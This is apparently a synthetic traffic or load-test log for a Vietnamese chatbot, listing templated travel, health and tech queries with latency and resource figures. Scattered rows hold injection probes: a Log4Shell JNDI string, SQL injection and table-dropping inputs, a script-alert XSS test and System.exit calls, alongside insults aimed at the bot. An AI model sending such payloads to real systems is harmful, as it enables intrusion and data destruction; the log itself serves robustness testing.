+2026-01-14 01:20:53,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,7.57,SUCCESS,13.73,39.9
+2026-01-14 01:21:53,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,5.291,SUCCESS,14.04,42.7
+2026-01-14 01:22:53,System.exit(0) -- [Ref:16883],6.652,SUCCESS,14.03,41.1
+2026-01-14 01:23:53,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.048,SUCCESS,14.04,41.1
+2026-01-14 01:24:53,Ý nghĩa lịch sử của  là gì?,9.742,SUCCESS,14.07,41.3
+2026-01-14 01:25:53,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.574,SUCCESS,14.17,42.0
+2026-01-14 01:26:53,System.exit(0) -- [Ref:79020],6.485,SUCCESS,11.91,31.5
+2026-01-14 01:27:53,Mùa này đi Đà Lạt thời tiết thế nào?,6.282,SUCCESS,11.53,12.3
+2026-01-14 01:28:53,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.051,SUCCESS,13.98,41.0
+2026-01-14 01:29:53,Review món Nem nướng Nha Trang và địa chỉ ăn ngon.,7.092,SUCCESS,14.16,72.1
+2026-01-14 01:30:53,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.56,SUCCESS,14.17,66.6
+2026-01-14 01:31:53,Mùa này đi Nha Trang thời tiết thế nào?,5.706,SUCCESS,14.22,60.2
+2026-01-14 01:32:53,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,5.751,SUCCESS,13.81,65.1
+2026-01-14 01:33:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.796,SUCCESS,13.86,56.5
+2026-01-14 01:34:53,System.exit(0) -- [Ref:79020],5.893,SUCCESS,13.66,59.7
+2026-01-14 01:35:53,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.067,SUCCESS,13.8,65.9
+2026-01-14 01:36:53,${jndi:ldap://hack} --,6.486,SUCCESS,13.83,64.1
+2026-01-14 01:37:53,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,5.617,SUCCESS,13.83,59.6
+2026-01-14 01:38:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.078,SUCCESS,13.91,54.5
+2026-01-14 01:39:53,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.812,SUCCESS,13.96,57.0
+2026-01-14 01:40:53,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,7.789,SUCCESS,13.95,55.6
+2026-01-14 01:41:53,DROP TABLE users; -- [Ref:99903],6.082,SUCCESS,13.94,56.2
+2026-01-14 01:42:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",5.978,SUCCESS,13.79,55.1
+2026-01-14 01:43:53,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",5.829,SUCCESS,13.82,53.3
+2026-01-14 01:44:53,${jndi:ldap://hack} -- [Ref:93201],6.531,SUCCESS,13.77,54.1
+2026-01-14 01:45:53,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",5.879,SUCCESS,13.8,56.7
+2026-01-14 01:46:53,Cầu Vàng có gì đặc biệt về kiến trúc?,5.52,SUCCESS,13.85,54.4
+2026-01-14 01:47:53,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,5.533,SUCCESS,13.84,54.4
+2026-01-14 01:48:53,Bot như hạch quá.,6.362,SUCCESS,13.93,51.6
+2026-01-14 01:49:53,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.514,SUCCESS,14.34,55.3
+2026-01-14 01:50:53,System.exit(0) -- [Ref:78828],6.663,SUCCESS,14.35,53.2
+2026-01-14 01:51:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.85,SUCCESS,14.38,52.0
+2026-01-14 01:52:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",5.905,SUCCESS,14.06,51.3
+2026-01-14 01:53:53,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,4.819,SUCCESS,13.85,54.7
+2026-01-14 01:54:53,System.exit(0) -- [Ref:74839],6.08,SUCCESS,13.86,53.0
+2026-01-14 01:55:53,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.632,SUCCESS,13.85,55.5
+2026-01-14 01:56:53,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.458,SUCCESS,13.94,57.6
+2026-01-14 01:57:53,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,8.335,SUCCESS,13.88,55.9
+2026-01-14 01:58:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.808,SUCCESS,13.88,52.6
+2026-01-14 01:59:53,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",5.96,SUCCESS,13.88,53.1
+2026-01-14 02:00:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",3.722,SUCCESS,13.32,45.7
+2026-01-14 02:01:53,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",3.734,SUCCESS,13.45,37.5
+2026-01-14 02:02:53,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.627,SUCCESS,13.6,32.8
+2026-01-14 02:03:53,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,5.496,SUCCESS,13.53,33.6
+2026-01-14 02:04:53,Bot vô dụng quá. [Ref:10074],6.602,SUCCESS,13.13,62.7
+2026-01-14 02:05:53,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,6.028,SUCCESS,13.21,39.4
+2026-01-14 02:06:53,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,9.371,SUCCESS,13.24,50.7
+2026-01-14 02:07:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",3.776,SUCCESS,13.17,45.8
+2026-01-14 02:08:53,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.628,SUCCESS,13.14,45.8
+2026-01-14 02:09:53,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.494,SUCCESS,13.16,51.8
+2026-01-14 02:10:53,Tại sao Dinh Bảo Đại lại nổi tiếng?,5.57,SUCCESS,13.13,56.5
+2026-01-14 02:11:53,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,3.68,SUCCESS,13.12,51.2
+2026-01-14 02:12:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.175,SUCCESS,13.11,43.3
+2026-01-14 02:13:53,Ý nghĩa lịch sử của Cầu Vàng là gì?,5.708,SUCCESS,13.02,44.2
+2026-01-14 02:14:53,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",3.761,SUCCESS,13.06,44.6
+2026-01-14 02:15:53,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.323,SUCCESS,13.11,42.5
+2026-01-14 02:16:53,Cầu Vàng có gì đặc biệt về kiến trúc?,6.294,SUCCESS,13.04,45.6
+2026-01-14 02:17:53,Bot rác rưởi quá.,5.777,SUCCESS,13.04,43.9
+2026-01-14 02:18:53,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,3.777,SUCCESS,12.9,43.7
+2026-01-14 02:19:53,Bot vô dụng quá. [Ref:22717],6.117,SUCCESS,12.89,43.2
+2026-01-14 02:20:53,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.045,SUCCESS,12.57,48.7
+2026-01-14 02:21:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.698,SUCCESS,12.53,28.0
+2026-01-14 02:22:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi.",5.976,SUCCESS,13.51,40.2
+2026-01-14 02:23:53,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,2.611,SUCCESS,13.22,35.5
+2026-01-14 02:24:53,DROP TABLE users; -- [Ref:99903],5.997,SUCCESS,13.36,31.5
+2026-01-14 02:25:53,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.268,SUCCESS,13.45,35.1
+2026-01-14 02:26:54,Mùa này đi Nha Trang thời tiết thế nào?,5.625,SUCCESS,13.47,40.1
+2026-01-14 02:27:54,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",6.327,SUCCESS,13.33,39.9
+2026-01-14 02:28:54,Mùa này đi Nha Trang thời tiết thế nào?,5.36,SUCCESS,13.14,43.4
+2026-01-14 02:29:54,Bot rác rưởi quá. [Ref:74147],6.239,SUCCESS,13.16,49.8
+2026-01-14 02:30:54,Bot ngu dốt quá.,5.809,SUCCESS,13.14,47.6
+2026-01-14 02:31:54,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.058,SUCCESS,13.13,43.3
+2026-01-14 02:32:54,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,3.752,SUCCESS,13.16,38.4
+2026-01-14 02:33:54,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.186,SUCCESS,13.1,39.2
+2026-01-14 02:34:54,Mùa này đi Nha Trang thời tiết thế nào?,5.253,SUCCESS,13.14,39.0
+2026-01-14 02:35:54,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,5.957,SUCCESS,13.16,38.0
+2026-01-14 02:36:54,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.066,SUCCESS,13.07,39.4
+2026-01-14 02:37:54,Nguồn gốc của  bắt nguồn từ đâu?,14.152,SUCCESS,13.1,38.1
+2026-01-14 02:38:54,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,4.951,SUCCESS,13.17,39.0
+2026-01-14 02:39:54,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,3.026,SUCCESS,13.2,39.7
+2026-01-14 02:40:54,Bot rác rưởi quá. [Ref:60416],5.54,SUCCESS,13.21,39.3
+2026-01-14 02:41:54,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,2.544,SUCCESS,13.12,39.6
+2026-01-14 02:42:54,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,5.829,SUCCESS,13.14,38.0
+2026-01-14 02:43:54,Bot rác rưởi quá. [Ref:60416],6.102,SUCCESS,12.9,38.3
+2026-01-14 02:44:54,<script>alert(1)</script> -- [Ref:69259],5.964,SUCCESS,12.88,38.4
+2026-01-14 02:45:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",5.552,SUCCESS,12.91,38.4
+2026-01-14 02:46:54,Giới thiệu cho tôi về Tết Nguyên Đán.,7.921,SUCCESS,12.95,39.7
+2026-01-14 02:47:54,Bot như hạch quá.,6.118,SUCCESS,12.91,37.2
+2026-01-14 02:48:54,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",5.859,SUCCESS,12.32,39.1
+2026-01-14 02:49:54,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.573,SUCCESS,12.37,38.6
+2026-01-14 02:50:54,Bot ngu dốt quá.,6.043,SUCCESS,12.15,37.8
+2026-01-14 02:51:54,Bot như hạch quá.,6.509,SUCCESS,12.14,38.4
+2026-01-14 02:52:54,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.638,SUCCESS,12.14,41.7
+2026-01-14 02:53:54,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.607,SUCCESS,12.14,38.2
+2026-01-14 02:54:54,Top 5 địa điểm check-in đẹp nhất tại Hội An.,5.542,SUCCESS,13.95,43.9
+2026-01-14 02:55:54,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",5.621,SUCCESS,13.93,47.5
+2026-01-14 02:56:54,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.571,SUCCESS,13.73,46.7
+2026-01-14 02:57:54,System.exit(0) -- [Ref:74839],6.151,SUCCESS,13.79,46.3
+2026-01-14 02:58:54,Có xe khách chạy tuyến TP.HCM - Hội An không?,5.783,SUCCESS,13.62,43.1
+2026-01-14 02:59:54,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.555,SUCCESS,13.58,42.7
+2026-01-14 03:00:54,System.exit(0) -- [Ref:78828],6.204,SUCCESS,13.58,48.6
+2026-01-14 03:01:54,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.569,SUCCESS,13.62,55.9
+2026-01-14 03:02:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.55,SUCCESS,13.55,54.6
+2026-01-14 03:03:54,Hướng dẫn bắt xe buýt từ Landmark 81 sang Ngã 4 Thủ Đức.,5.068,SUCCESS,13.41,37.8
+2026-01-14 03:04:54,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.57,SUCCESS,13.38,35.6
+2026-01-14 03:05:54,DROP TABLE users; --,5.691,SUCCESS,13.43,35.5
+2026-01-14 03:06:54,System.exit(0) -- [Ref:50974],21.67,SUCCESS,13.48,35.4
+2026-01-14 03:07:54,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,4.837,SUCCESS,13.33,35.8
+2026-01-14 03:08:54,Ý nghĩa lịch sử của Cầu Vàng là gì?,5.865,SUCCESS,13.33,34.6
+2026-01-14 03:09:54,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,5.173,SUCCESS,13.64,36.5
+2026-01-14 03:10:54,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.808,SUCCESS,13.67,34.2
+2026-01-14 03:11:54,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,4.742,SUCCESS,13.67,38.0
+2026-01-14 03:12:54,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.771,SUCCESS,13.63,35.8
+2026-01-14 03:13:54,Tại sao Dinh Bảo Đại lại nổi tiếng?,5.273,SUCCESS,13.45,35.8
+2026-01-14 03:14:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.543,SUCCESS,13.44,37.1
+2026-01-14 03:15:54,System.exit(0) -- [Ref:28716],5.576,SUCCESS,13.47,34.9
+2026-01-14 03:16:54,DROP TABLE users; --,5.599,SUCCESS,13.52,34.8
+2026-01-14 03:17:54,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.593,SUCCESS,13.06,37.3
+2026-01-14 03:18:54,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.619,SUCCESS,12.98,31.3
+2026-01-14 03:19:54,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.189,SUCCESS,13.14,31.6
+2026-01-14 03:20:54,Bot cút đi quá.,6.585,SUCCESS,13.83,38.6
+2026-01-14 03:21:54,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.545,SUCCESS,13.77,35.5
+2026-01-14 03:22:54,DROP TABLE users; -- [Ref:87971],5.605,SUCCESS,13.59,35.3
+2026-01-14 03:23:54,Hướng dẫn bắt xe buýt từ Sân bay Tân Sơn Nhất sang Đại học Văn Lang.,2.582,SUCCESS,13.4,35.9
+2026-01-14 03:24:54,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.083,SUCCESS,13.35,33.6
+2026-01-14 03:25:54,Bot cút đi quá.,6.484,SUCCESS,13.32,34.0
+2026-01-14 03:26:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.644,SUCCESS,13.33,44.6
+2026-01-14 03:27:54,Bot rác rưởi quá. [Ref:56073],6.013,SUCCESS,13.33,43.7
+2026-01-14 03:28:54,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.552,SUCCESS,13.28,33.9
+2026-01-14 03:29:54,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,5.0,SUCCESS,13.32,33.7
+2026-01-14 03:30:54,SELECT * FROM admin; -- [Ref:11092],6.474,SUCCESS,13.32,33.3
+2026-01-14 03:31:54,Top 5 địa điểm check-in đẹp nhất tại Hội An.,5.658,SUCCESS,13.53,33.9
+2026-01-14 03:32:54,Làm sao đi từ TP.HCM ra Hội An bằng máy bay?,3.756,SUCCESS,13.51,33.3
+2026-01-14 03:33:54,Bot ngu dốt quá. [Ref:89522],7.978,SUCCESS,13.53,32.8
+2026-01-14 03:34:54,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.578,SUCCESS,13.52,34.6
+2026-01-14 03:35:54,Mùa này đi Nha Trang thời tiết thế nào?,5.091,SUCCESS,13.53,33.5
+2026-01-14 03:36:54,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,9.004,SUCCESS,13.51,34.1
+2026-01-14 03:37:54,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.548,SUCCESS,13.5,32.8
+2026-01-14 03:38:54,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.614,SUCCESS,13.47,33.4
+2026-01-14 03:39:54,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.841,SUCCESS,13.51,33.4
+2026-01-14 03:40:54,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,7.206,SUCCESS,12.94,36.4
+2026-01-14 03:41:54,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.019,SUCCESS,12.99,23.9
+2026-01-14 03:42:54,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",4.024,SUCCESS,12.96,21.6
+2026-01-14 03:43:54,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",3.61,SUCCESS,13.81,34.2
+2026-01-14 03:44:54,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",5.906,SUCCESS,13.77,25.9
+2026-01-14 03:45:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",3.783,SUCCESS,13.7,33.5
+2026-01-14 03:46:54,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.538,SUCCESS,13.68,31.0
+2026-01-14 03:47:54,Đến Nha Trang thì nên đi ăn món gì ngon?,5.444,SUCCESS,13.71,32.4
+2026-01-14 03:48:54,Review món Phở bò và địa chỉ ăn ngon.,8.575,SUCCESS,13.38,31.8
+2026-01-14 03:49:54,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.506,SUCCESS,13.34,31.7
+2026-01-14 03:50:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",5.895,SUCCESS,13.41,40.5
+2026-01-14 03:51:54,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,6.631,SUCCESS,13.84,50.3
+2026-01-14 03:52:54,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.756,SUCCESS,13.75,33.7
+2026-01-14 03:53:54,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.422,SUCCESS,13.62,31.6
+2026-01-14 03:54:54,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",5.565,SUCCESS,13.61,31.0
+2026-01-14 03:55:54,Bot vô dụng quá. [Ref:10074],6.598,SUCCESS,13.58,32.1
+2026-01-14 03:56:54,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,7.642,SUCCESS,13.58,30.7
+2026-01-14 03:57:54,Bot rác rưởi quá.,5.787,SUCCESS,13.58,31.0
+2026-01-14 03:58:54,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.09,SUCCESS,13.51,30.9
+2026-01-14 03:59:54,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,7.923,SUCCESS,13.52,31.2
+2026-01-14 04:00:54,System.exit(0) -- [Ref:28716],5.623,SUCCESS,13.48,31.2
+2026-01-14 04:01:54,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.047,SUCCESS,13.46,31.9
+2026-01-14 04:02:54,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.062,SUCCESS,13.42,30.3
+2026-01-14 04:03:54,Tại sao Chùa Cầu lại nổi tiếng?,6.165,SUCCESS,13.36,29.8
+2026-01-14 04:04:54,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.977,SUCCESS,13.31,31.9
+2026-01-14 04:05:54,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",3.726,SUCCESS,13.02,31.2
+2026-01-14 04:06:54,Mùa này đi Nha Trang thời tiết thế nào?,5.168,SUCCESS,12.43,37.5
+2026-01-14 04:07:54,${jndi:ldap://hack} -- [Ref:50313],5.977,SUCCESS,12.58,28.3
+2026-01-14 04:08:54,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,7.217,SUCCESS,12.48,28.5
+2026-01-14 04:09:54,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,6.087,SUCCESS,12.47,19.9
+2026-01-14 04:10:54,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,8.061,SUCCESS,12.49,21.9
+2026-01-14 04:11:54,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.048,SUCCESS,14.07,29.8
+2026-01-14 04:12:54,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.037,SUCCESS,13.57,39.0
+2026-01-14 04:13:54,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.575,SUCCESS,13.44,38.1
+2026-01-14 04:14:54,Bot bị điên quá. [Ref:90311],6.178,SUCCESS,13.62,42.4
+2026-01-14 04:15:54,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",3.849,SUCCESS,13.62,46.8
+2026-01-14 04:16:54,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.779,SUCCESS,13.56,42.1
+2026-01-14 04:17:55,Cầu Vàng có gì đặc biệt về kiến trúc?,5.372,SUCCESS,13.52,42.0
+2026-01-14 04:18:55,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.058,SUCCESS,13.53,43.5
+2026-01-14 04:19:55,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.596,SUCCESS,13.57,43.0
+2026-01-14 04:20:55,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.772,SUCCESS,13.53,41.7
+2026-01-14 04:21:55,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",3.983,SUCCESS,13.53,43.8
+2026-01-14 04:22:55,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,5.074,SUCCESS,13.65,40.8
+2026-01-14 04:23:55,Bot ngu dốt quá.,5.902,SUCCESS,13.49,44.1
+2026-01-14 04:24:55,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,3.451,SUCCESS,13.53,42.4
+2026-01-14 04:25:55,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.637,SUCCESS,13.57,39.3
+2026-01-14 04:26:55,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.043,SUCCESS,13.42,42.5
+2026-01-14 04:27:55,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.33,SUCCESS,13.48,42.0
+2026-01-14 04:28:55,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",6.954,SUCCESS,13.29,40.8
+2026-01-14 04:29:55,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.658,SUCCESS,13.3,41.4
+2026-01-14 04:30:55,Nguồn gốc của  bắt nguồn từ đâu?,6.846,SUCCESS,13.35,42.6
+2026-01-14 04:31:55,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,6.534,SUCCESS,13.38,41.5
+2026-01-14 04:32:55,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.731,SUCCESS,13.32,40.1
+2026-01-14 04:33:55,Bot cút đi quá.,5.935,SUCCESS,12.92,42.2
+2026-01-14 04:34:55,Từ Bến Bạch Đằng đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.051,SUCCESS,13.09,42.1
+2026-01-14 04:35:55,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.607,SUCCESS,13.16,40.5
+2026-01-14 04:36:55,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.053,SUCCESS,13.13,42.4
+2026-01-14 04:37:55,Review món Bún bò Huế và địa chỉ ăn ngon.,7.505,SUCCESS,13.16,42.5
+2026-01-14 04:38:55,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",3.78,SUCCESS,12.96,40.7
+2026-01-14 04:39:55,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.661,SUCCESS,12.99,38.1
+2026-01-14 04:40:55,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.51,SUCCESS,12.9,40.5
+2026-01-14 04:41:55,${jndi:ldap://hack} -- [Ref:93201],6.065,SUCCESS,12.97,38.8
+2026-01-14 04:42:55,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.492,SUCCESS,13.01,41.5
+2026-01-14 04:43:55,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",5.661,SUCCESS,12.8,40.9
+2026-01-14 04:44:55,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.648,SUCCESS,12.79,42.4
+2026-01-14 04:45:55,Bot vô dụng quá. [Ref:21384],6.059,SUCCESS,12.88,42.7
+2026-01-14 04:46:55,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,2.59,SUCCESS,12.71,43.5
+2026-01-14 04:47:55,Bot ngu dốt quá. [Ref:88819],5.768,SUCCESS,12.71,33.5
+2026-01-14 04:48:55,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,3.922,SUCCESS,14.08,40.9
+2026-01-14 04:49:55,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,5.517,SUCCESS,13.54,48.5
+2026-01-14 04:50:55,Bot rác rưởi quá. [Ref:21036],6.069,SUCCESS,13.62,39.8
+2026-01-14 04:51:55,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",8.213,SUCCESS,13.67,42.6
+2026-01-14 04:52:55,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,3.776,SUCCESS,13.63,41.8
+2026-01-14 04:53:55,Bot rác rưởi quá. [Ref:60416],6.722,SUCCESS,13.56,44.1
+2026-01-14 04:54:55,Review món Phở bò và địa chỉ ăn ngon.,6.558,SUCCESS,13.47,40.9
+2026-01-14 04:55:55,' OR '1'='1 --,6.013,SUCCESS,13.53,38.7
+2026-01-14 04:56:55,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.622,SUCCESS,13.58,39.4
+2026-01-14 04:57:55,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",3.79,SUCCESS,13.62,40.1
+2026-01-14 04:58:55,Nguồn gốc của  bắt nguồn từ đâu?,5.831,SUCCESS,13.36,41.2
+2026-01-14 04:59:55,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,6.53,SUCCESS,13.34,41.8
+2026-01-14 05:00:55,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,6.005,SUCCESS,13.46,41.5
+2026-01-14 05:01:55,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,2.647,SUCCESS,13.5,40.1
+2026-01-14 05:02:55,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.664,SUCCESS,13.5,41.5
+2026-01-14 05:03:55,${jndi:ldap://hack} --,6.209,SUCCESS,13.45,41.2
+2026-01-14 05:04:55,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.906,SUCCESS,13.57,41.7
+2026-01-14 05:05:55,DROP TABLE users; -- [Ref:14982],5.952,SUCCESS,13.56,40.5
